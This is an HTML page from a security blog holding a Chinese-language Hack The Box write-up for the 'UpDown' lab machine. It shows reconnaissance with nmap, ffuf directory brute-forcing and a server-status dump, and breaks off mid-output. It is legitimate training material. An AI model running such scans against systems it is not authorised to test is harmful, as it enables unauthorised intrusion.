@@ -1,0 +1,828 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="shiyan">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="0x00 靶场技能介绍章节技能：目录扫描、二级目录扫描、虚拟主机子域名扫描、.git源码泄露、git_dumper.py、.htaccess 配置文件、文件上传绕过、上传扩展名为 png 的 zip 文件、phar:&#x2F;&#x2F;path、二进制文件字符串分析、Python内置命令执行代码、ssh秘钥获取并登录、sudo提权、easy_install提权">
+<meta property="og:type" content="article">
+<meta property="og:title" content="UpDown-htb-writeup">
+<meta property="og:url" content="https://sh1yan.top/2024/04/28/UpDown-htb-writeup/index.html">
+<meta property="og:site_name" content="sh1yan&#39;blog">
+<meta property="og:description" content="0x00 靶场技能介绍章节技能：目录扫描、二级目录扫描、虚拟主机子域名扫描、.git源码泄露、git_dumper.py、.htaccess 配置文件、文件上传绕过、上传扩展名为 png 的 zip 文件、phar:&#x2F;&#x2F;path、二进制文件字符串分析、Python内置命令执行代码、ssh秘钥获取并登录、sudo提权、easy_install提权">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://sh1yan.top/photo/UpDown-htb-writeup/1.png">
+<meta property="og:image" content="http://sh1yan.top/photo/UpDown-htb-writeup/2.png">
+<meta property="og:image" content="http://sh1yan.top/photo/UpDown-htb-writeup/4.png">
+<meta property="og:image" content="http://sh1yan.top/photo/UpDown-htb-writeup/3.png">
+<meta property="og:image" content="http://sh1yan.top/photo/UpDown-htb-writeup/5.png">
+<meta property="og:image" content="http://sh1yan.top/photo/UpDown-htb-writeup/6.png">
+<meta property="og:image" content="http://sh1yan.top/photo/UpDown-htb-writeup/7.png">
+<meta property="og:image" content="http://sh1yan.top/photo/UpDown-htb-writeup/8.png">
+<meta property="og:image" content="http://sh1yan.top/photo/UpDown-htb-writeup/9.png">
+<meta property="og:image" content="http://sh1yan.top/photo/UpDown-htb-writeup/10.png">
+<meta property="og:image" content="http://sh1yan.top/photo/UpDown-htb-writeup/11.png">
+<meta property="article:published_time" content="2024-04-28T15:50:55.000Z">
+<meta property="article:modified_time" content="2024-05-07T03:22:28.380Z">
+<meta property="article:author" content="shiyan">
+<meta property="article:tag" content="shooting-range">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="http://sh1yan.top/photo/UpDown-htb-writeup/1.png">
+  
+  
+  
+  <title>UpDown-htb-writeup - sh1yan&#39;blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"sh1yan.top","root":"/","version":"1.9.5","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>sh1yan&#39;blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/yqlj/" target="_self">
+                <i class="iconfont icon-link-fill"></i>
+                <span>友链</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item dropdown">
+              <a class="nav-link dropdown-toggle" target="_self" href="javascript:;" role="button"
+                 data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
+                <i class="iconfont icon-th-large"></i>
+                <span>其他</span>
+              </a>
+              <div class="dropdown-menu" aria-labelledby="navbarDropdown">
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="/open-source/" target="_self">
+                    
+                    <span>我开源的安全项目</span>
+                  </a>
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="/rt-cmd/" target="_self">
+                    
+                    <span>反弹shell命令集合</span>
+                  </a>
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="/reverse-shell/" target="_self">
+                    
+                    <span>简易反弹shell集合</span>
+                  </a>
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="/P2note/" target="_self">
+                    
+                    <span>综合安全工具集合</span>
+                  </a>
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="/WebDeveloper/" target="_self">
+                    
+                    <span>网站开发者工具箱</span>
+                  </a>
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="/linux-command/" target="_self">
+                    
+                    <span>Linux命令工具箱</span>
+                  </a>
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="/CyberChef/" target="_self">
+                    
+                    <span>CyberChef工具箱</span>
+                  </a>
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="/Quick-Reference/" target="_self">
+                    
+                    <span>开发者速查备忘录</span>
+                  </a>
+                
+              </div>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="UpDown-htb-writeup"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2024-04-28 23:50" pubdate>
+          2024年4月28日 晚上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          32k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          266 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">UpDown-htb-writeup</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h4 id="0x00-靶场技能介绍"><a href="#0x00-靶场技能介绍" class="headerlink" title="0x00 靶场技能介绍"></a>0x00 靶场技能介绍</h4><p>章节技能：目录扫描、二级目录扫描、虚拟主机子域名扫描、.git源码泄露、git_dumper.py、.htaccess 配置文件、文件上传绕过、上传扩展名为 png 的 zip 文件、phar:&#x2F;&#x2F;path、二进制文件字符串分析、Python内置命令执行代码、ssh秘钥获取并登录、sudo提权、easy_install提权</p>
+<span id="more"></span>  
+
+<p>参考链接：<code>https://htbwp.readthedocs.io/en/latest/linux/UpDown.html</code></p>
+<p>参考链接：<code>https://0xdf.gitlab.io/2023/01/21/htb-updown.html</code></p>
+<h4 id="0x01-用户权限获取"><a href="#0x01-用户权限获取" class="headerlink" title="0x01 用户权限获取"></a>0x01 用户权限获取</h4><p>1、获取下靶机IP地址：10.10.11.177</p>
+<p>2、获取下开放端口情况：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs c">┌──(kali㉿offsec)-[~/Desktop]<br>└─$ sudo nmap -p- --min-rate=<span class="hljs-number">2000</span> <span class="hljs-number">10.10</span><span class="hljs-number">.11</span><span class="hljs-number">.177</span> -oG allports -Pn <br>[sudo] kali 的密码：<br>Starting Nmap <span class="hljs-number">7.94</span>SVN ( https:<span class="hljs-comment">//nmap.org ) at 2024-04-28 07:22 CST</span><br>Nmap scan report <span class="hljs-keyword">for</span> <span class="hljs-number">10.10</span><span class="hljs-number">.11</span><span class="hljs-number">.177</span><br>Host is up (<span class="hljs-number">0.10</span>s latency).<br>Not shown: <span class="hljs-number">65533</span> closed tcp ports (reset)<br>PORT   STATE SERVICE<br><span class="hljs-number">22</span>/tcp open  ssh<br><span class="hljs-number">80</span>/tcp open  http<br><br>Nmap done: <span class="hljs-number">1</span> IP address (<span class="hljs-number">1</span> host up) scanned in <span class="hljs-number">40.22</span> seconds<br>                                                                                                                                                                                        <br>┌──(kali㉿offsec)-[~/Desktop]<br>└─$ sudo nmap -p22,<span class="hljs-number">80</span> -sC -sV --min-rate=<span class="hljs-number">2000</span> <span class="hljs-number">10.10</span><span class="hljs-number">.11</span><span class="hljs-number">.177</span> -Pn              <br>Starting Nmap <span class="hljs-number">7.94</span>SVN ( https:<span class="hljs-comment">//nmap.org ) at 2024-04-28 07:24 CST</span><br>Nmap scan report <span class="hljs-keyword">for</span> <span class="hljs-number">10.10</span><span class="hljs-number">.11</span><span class="hljs-number">.177</span><br>Host is up (<span class="hljs-number">0.10</span>s latency).<br><br>PORT   STATE SERVICE VERSION<br><span class="hljs-number">22</span>/tcp open  ssh     OpenSSH <span class="hljs-number">8.2</span>p1 Ubuntu <span class="hljs-number">4u</span>buntu0<span class="hljs-number">.5</span> (Ubuntu Linux; protocol <span class="hljs-number">2.0</span>)<br>| ssh-hostkey: <br>|   <span class="hljs-number">3072</span> <span class="hljs-number">9</span>e:<span class="hljs-number">1f</span>:<span class="hljs-number">98</span>:d7:c8:ba:<span class="hljs-number">61</span>:db:f1:<span class="hljs-number">49</span>:<span class="hljs-number">66</span>:<span class="hljs-number">9</span>d:<span class="hljs-number">70</span>:<span class="hljs-number">17</span>:<span class="hljs-number">02</span>:e7 (RSA)<br>|   <span class="hljs-number">256</span> c2:<span class="hljs-number">1</span>c:fe:<span class="hljs-number">11</span>:<span class="hljs-number">52</span>:e3:d7:e5:f7:<span class="hljs-number">59</span>:<span class="hljs-number">18</span>:<span class="hljs-number">6b</span>:<span class="hljs-number">68</span>:<span class="hljs-number">45</span>:<span class="hljs-number">3f</span>:<span class="hljs-number">62</span> (ECDSA)<br>|_  <span class="hljs-number">256</span> <span class="hljs-number">5f</span>:<span class="hljs-number">6</span>e:<span class="hljs-number">12</span>:<span class="hljs-number">67</span>:<span class="hljs-number">0</span>a:<span class="hljs-number">66</span>:e8:e2:b7:<span class="hljs-number">61</span>:be:c4:<span class="hljs-number">14</span>:<span class="hljs-number">3</span>a:d3:<span class="hljs-number">8</span>e (ED25519)<br><span class="hljs-number">80</span>/tcp open  http    Apache httpd <span class="hljs-number">2.4</span><span class="hljs-number">.41</span> ((Ubuntu))<br>|_http-title: Is my Website up ?<br>|_http-server-header: Apache/<span class="hljs-number">2.4</span><span class="hljs-number">.41</span> (Ubuntu)<br>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel<br><br>Service detection performed. Please report any incorrect results at https:<span class="hljs-comment">//nmap.org/submit/ .</span><br>Nmap done: <span class="hljs-number">1</span> IP address (<span class="hljs-number">1</span> host up) scanned in <span class="hljs-number">12.36</span> seconds<br></code></pre></td></tr></table></figure>
+
+<p>3、绑定下域名地址，再查看下默认的80端口信息</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c">┌──(kali㉿offsec)-[~/Desktop]<br>└─$ echo <span class="hljs-string">&quot;10.10.11.177 siteisup.htb&quot;</span> | sudo tee -a /etc/hosts<br>[sudo] kali 的密码：<br><span class="hljs-number">10.10</span><span class="hljs-number">.11</span><span class="hljs-number">.177</span> siteisup.htb<br></code></pre></td></tr></table></figure>
+
+<p><code>http://10.10.11.177/</code></p>
+<p><img src="http://sh1yan.top/photo/UpDown-htb-writeup/1.png" srcset="/img/loading.gif" lazyload></p>
+<p>4、扫描下目录情况</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs c">┌──(kali㉿offsec)-[~/Desktop]<br>└─$ ffuf -u http:<span class="hljs-comment">//10.10.11.177/FUZZ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt </span><br><br>        /<span class="hljs-string">&#x27;___\  /&#x27;</span>___\           /<span class="hljs-string">&#x27;___\       </span><br><span class="hljs-string">       /\ \__/ /\ \__/  __  __  /\ \__/       </span><br><span class="hljs-string">       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      </span><br><span class="hljs-string">        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      </span><br><span class="hljs-string">         \ \_\   \ \_\  \ \____/  \ \_\       </span><br><span class="hljs-string">          \/_/    \/_/   \/___/    \/_/       </span><br><span class="hljs-string"></span><br><span class="hljs-string">       v2.1.0-dev</span><br><span class="hljs-string">________________________________________________</span><br><span class="hljs-string"></span><br><span class="hljs-string"> :: Method           : GET</span><br><span class="hljs-string"> :: URL              : http://10.10.11.177/FUZZ</span><br><span class="hljs-string"> :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt</span><br><span class="hljs-string"> :: Follow redirects : false</span><br><span class="hljs-string"> :: Calibration      : false</span><br><span class="hljs-string"> :: Timeout          : 10</span><br><span class="hljs-string"> :: Threads          : 40</span><br><span class="hljs-string"> :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500</span><br><span class="hljs-string">________________________________________________</span><br><span class="hljs-string"></span><br><span class="hljs-string">#                       [Status: 200, Size: 1131, Words: 186, Lines: 40, Duration: 105ms]</span><br><span class="hljs-string"># Copyright 2007 James Fisher [Status: 200, Size: 1131, Words: 186, Lines: 40, Duration: 105ms]</span><br><span class="hljs-string">#                       [Status: 200, Size: 1131, Words: 186, Lines: 40, Duration: 106ms]</span><br><span class="hljs-string"># directory-list-2.3-medium.txt [Status: 200, Size: 1131, Words: 186, Lines: 40, Duration: 107ms]</span><br><span class="hljs-string"># license, visit http://creativecommons.org/licenses/by-sa/3.0/ [Status: 200, Size: 1131, Words: 186, Lines: 40, Duration: 111ms]</span><br><span class="hljs-string"># or send a letter to Creative Commons, 171 Second Street, [Status: 200, Size: 1131, Words: 186, Lines: 40, Duration: 113ms]</span><br><span class="hljs-string"># Attribution-Share Alike 3.0 License. To view a copy of this [Status: 200, Size: 1131, Words: 186, Lines: 40, Duration: 3450ms]</span><br><span class="hljs-string"># This work is licensed under the Creative Commons [Status: 200, Size: 1131, Words: 186, Lines: 40, Duration: 3451ms]</span><br><span class="hljs-string"># on at least 2 different hosts [Status: 200, Size: 1131, Words: 186, Lines: 40, Duration: 6904ms]</span><br><span class="hljs-string"># Priority ordered case-sensitive list, where entries were found [Status: 200, Size: 1131, Words: 186, Lines: 40, Duration: 6910ms]</span><br><span class="hljs-string">#                       [Status: 200, Size: 1131, Words: 186, Lines: 40, Duration: 6907ms]</span><br><span class="hljs-string">                        [Status: 200, Size: 1131, Words: 186, Lines: 40, Duration: 9721ms]</span><br><span class="hljs-string">#                       [Status: 200, Size: 1131, Words: 186, Lines: 40, Duration: 114ms]</span><br><span class="hljs-string"># Suite 300, San Francisco, California, 94105, USA. [Status: 200, Size: 1131, Words: 186, Lines: 40, Duration: 115ms]</span><br><span class="hljs-string">dev                     [Status: 301, Size: 310, Words: 20, Lines: 10, Duration: 106ms]</span><br><span class="hljs-string">                        [Status: 200, Size: 1131, Words: 186, Lines: 40, Duration: 107ms]</span><br><span class="hljs-string">server-status           [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 107ms]</span><br><span class="hljs-string">:: Progress: [220560/220560] :: Job [1/1] :: 232 req/sec :: Duration: [0:15:32] :: Errors: 132 ::</span><br></code></pre></td></tr></table></figure>
+
+<p>5、发现了2个文件，一个是dev目录一个是server-status，分别查看下</p>
+<p><code>http://siteisup.htb/server-status</code></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><code class="hljs c">HTTP/<span class="hljs-number">1.1</span> <span class="hljs-number">200</span> OK<br>Date: Sat, <span class="hljs-number">27</span> Apr <span class="hljs-number">2024</span> <span class="hljs-number">15</span>:<span class="hljs-number">51</span>:<span class="hljs-number">39</span> GMT<br>Server: Apache/<span class="hljs-number">2.4</span><span class="hljs-number">.41</span> (Ubuntu)<br>Vary: Accept-Encoding<br>Transfer-Encoding: chunked<br>Content-Type: text/html; charset=ISO<span class="hljs-number">-8859</span><span class="hljs-number">-1</span><br><br>&lt;!DOCTYPE HTML PUBLIC <span class="hljs-string">&quot;-//W3C//DTD HTML 3.2 Final//EN&quot;</span>&gt;<br>&lt;html&gt;&lt;head&gt;<br>&lt;title&gt;Apache Status&lt;/title&gt;<br>&lt;/head&gt;&lt;body&gt;<br>&lt;h1&gt;Apache Server Status <span class="hljs-keyword">for</span> siteisup.htb (via <span class="hljs-number">127.0</span><span class="hljs-number">.2</span><span class="hljs-number">.1</span>)&lt;/h1&gt;<br><br>&lt;dl&gt;&lt;dt&gt;Server Version: Apache/<span class="hljs-number">2.4</span><span class="hljs-number">.41</span> (Ubuntu)&lt;/dt&gt;<br>&lt;dt&gt;Server MPM: prefork&lt;/dt&gt;<br>&lt;dt&gt;Server Built: <span class="hljs-number">2022</span><span class="hljs-number">-06</span><span class="hljs-number">-14</span>T13:<span class="hljs-number">30</span>:<span class="hljs-number">55</span><br>&lt;/dt&gt;&lt;/dl&gt;&lt;hr /&gt;&lt;dl&gt;<br>&lt;dt&gt;Current Time: Saturday, <span class="hljs-number">27</span>-Apr<span class="hljs-number">-2024</span> <span class="hljs-number">15</span>:<span class="hljs-number">51</span>:<span class="hljs-number">39</span> UTC&lt;/dt&gt;<br>&lt;dt&gt;Restart Time: Saturday, <span class="hljs-number">27</span>-Apr<span class="hljs-number">-2024</span> <span class="hljs-number">15</span>:<span class="hljs-number">15</span>:<span class="hljs-number">58</span> UTC&lt;/dt&gt;<br>&lt;dt&gt;Parent Server Config. Generation: <span class="hljs-number">1</span>&lt;/dt&gt;<br>&lt;dt&gt;Parent Server MPM Generation: <span class="hljs-number">0</span>&lt;/dt&gt;<br>&lt;dt&gt;Server uptime:  <span class="hljs-number">35</span> minutes <span class="hljs-number">40</span> seconds&lt;/dt&gt;<br>&lt;dt&gt;Server load: <span class="hljs-number">0.75</span> <span class="hljs-number">1.07</span> <span class="hljs-number">0.54</span>&lt;/dt&gt;<br>&lt;dt&gt;Total accesses: <span class="hljs-number">254074</span> - Total Traffic: <span class="hljs-number">135.3</span> MB - Total Duration: <span class="hljs-number">628543</span>&lt;/dt&gt;<br>&lt;dt&gt;CPU Usage: u3<span class="hljs-number">.92</span> s3<span class="hljs-number">.76</span> cu11<span class="hljs-number">.11</span> cs9<span class="hljs-number">.73</span> - <span class="hljs-number">1.33</span>% CPU load&lt;/dt&gt;<br>&lt;dt&gt;<span class="hljs-number">119</span> requests/sec - <span class="hljs-number">64.7</span> kB/second - <span class="hljs-number">558</span> B/request - <span class="hljs-number">2.47386</span> ms/request&lt;/dt&gt;<br>&lt;dt&gt;<span class="hljs-number">54</span> requests currently being processed, <span class="hljs-number">6</span> idle workers&lt;/dt&gt;<br>&lt;/dl&gt;&lt;pre&gt;KK.KKK_KKKKKKKWKKKKKKKKKKKKKKKKKKKKKKK_KKKKKK.KKKK__KKK..K..._.W<br>K....K._.K......................................................<br>......................&lt;/pre&gt;<br>&lt;p&gt;Scoreboard Key:&lt;br /&gt;<br><span class="hljs-string">&quot;&lt;b&gt;&lt;code&gt;_&lt;/code&gt;&lt;/b&gt;&quot;</span> Waiting <span class="hljs-keyword">for</span> Connection, <br><span class="hljs-string">&quot;&lt;b&gt;&lt;code&gt;S&lt;/code&gt;&lt;/b&gt;&quot;</span> Starting up, <br><span class="hljs-string">&quot;&lt;b&gt;&lt;code&gt;R&lt;/code&gt;&lt;/b&gt;&quot;</span> Reading Request,&lt;br /&gt;<br><span class="hljs-string">&quot;&lt;b&gt;&lt;code&gt;W&lt;/code&gt;&lt;/b&gt;&quot;</span> Sending Reply, <br><span class="hljs-string">&quot;&lt;b&gt;&lt;code&gt;K&lt;/code&gt;&lt;/b&gt;&quot;</span> Keepalive (read), <br><span class="hljs-string">&quot;&lt;b&gt;&lt;code&gt;D&lt;/code&gt;&lt;/b&gt;&quot;</span> DNS Lookup,&lt;br /&gt;<br><span class="hljs-string">&quot;&lt;b&gt;&lt;code&gt;C&lt;/code&gt;&lt;/b&gt;&quot;</span> Closing connection, <br><span class="hljs-string">&quot;&lt;b&gt;&lt;code&gt;L&lt;/code&gt;&lt;/b&gt;&quot;</span> Logging, <br><span class="hljs-string">&quot;&lt;b&gt;&lt;code&gt;G&lt;/code&gt;&lt;/b&gt;&quot;</span> Gracefully finishing,&lt;br /&gt; <br><span class="hljs-string">&quot;&lt;b&gt;&lt;code&gt;I&lt;/code&gt;&lt;/b&gt;&quot;</span> Idle cleanup of worker, <br><span class="hljs-string">&quot;&lt;b&gt;&lt;code&gt;.&lt;/code&gt;&lt;/b&gt;&quot;</span> Open slot with no current process&lt;br /&gt;<br>&lt;/p&gt;<br><br><br>&lt;table border=<span class="hljs-string">&quot;0&quot;</span>&gt;&lt;tr&gt;&lt;th&gt;Srv&lt;/th&gt;&lt;th&gt;PID&lt;/th&gt;&lt;th&gt;Acc&lt;/th&gt;&lt;th&gt;M&lt;/th&gt;&lt;th&gt;CPU<br>&lt;/th&gt;&lt;th&gt;SS&lt;/th&gt;&lt;th&gt;Req&lt;/th&gt;&lt;th&gt;Dur&lt;/th&gt;&lt;th&gt;Conn&lt;/th&gt;&lt;th&gt;Child&lt;/th&gt;&lt;th&gt;Slot&lt;/th&gt;&lt;th&gt;Client&lt;/th&gt;&lt;th&gt;Protocol&lt;/th&gt;&lt;th&gt;VHost&lt;/th&gt;&lt;th&gt;Request&lt;/th&gt;&lt;/tr&gt;<br><br>&lt;tr&gt;&lt;td&gt;&lt;b&gt;<span class="hljs-number">3</span><span class="hljs-number">-0</span>&lt;/b&gt;&lt;/td&gt;&lt;td&gt;<span class="hljs-number">1375</span>&lt;/td&gt;&lt;td&gt;<span class="hljs-number">32</span>/<span class="hljs-number">1018</span>/<span class="hljs-number">7730</span>&lt;/td&gt;&lt;td&gt;&lt;b&gt;K&lt;/b&gt;<br>&lt;/td&gt;&lt;td&gt;<span 